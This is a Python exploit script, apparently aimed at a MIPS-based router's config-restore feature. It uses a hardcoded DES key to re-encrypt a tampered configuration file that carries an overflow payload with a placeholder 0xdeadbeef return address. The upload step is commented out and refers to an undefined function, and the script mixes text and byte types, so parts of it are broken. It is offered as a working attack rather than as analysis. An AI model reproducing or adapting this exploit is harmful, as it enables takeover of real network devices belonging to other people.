import sys
from Crypto.Cipher import DES
from hashlib import md5

key = b'\x47\x8D\xA5\x0B\xF9\xE3\xD2\xCF'
crypto = DES.new( key, DES.MODE_ECB )

def encrypt_config(config_txt):
    data = open(config_txt,'rb').read()
    md5_head = md5(data).digest()
    data_encrypted = crypto.encrypt(config_just(md5_head + data,8))
    print("md5_head: %s" % md5_head)
    open(config_txt + ".new.bin", 'wb').write(data_encrypted)
def mips_p32(num):
    num1 = num % 0x100
    num2 = (num >> 8) % 0x100
    num3 = (num >> 16) % 0x100
    num4 = (num >> 24) % 0x100
    return chr(num4) + chr(num3) + chr(num2) + chr(num1)
def exploit(url):
    global post_payload_base
    print("[+] Reading config.bin.txt...")
    fd = open("./config.bin.txt","rb")
    decrypt_config_base = fd.read()
    fd.close()
    print("[+] Writing config.exp.txt...")
    fd = open("./config.exp.txt","wb+")
    epc_offset = 3
    payload = ""
    payload += "\x01\x02\x03" + mips_p32(0xdeadbeef) + " " + '\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24'
    decrypt_config_base = decrypt_config_base.replace("{exploit_payload}",payload)
    fd.write(decrypt_config_base)
    fd.close()
    print("[+] Encrypt config.exp.txt...")
    encrypt_config("./config.exp.txt")
    #post_data(url)
if __name__ == "__main__":
    if len(sys.argv) >= 2:
        url = sys.argv[1]
    else:
        url = "192.168.1.1"
    exploit(url)
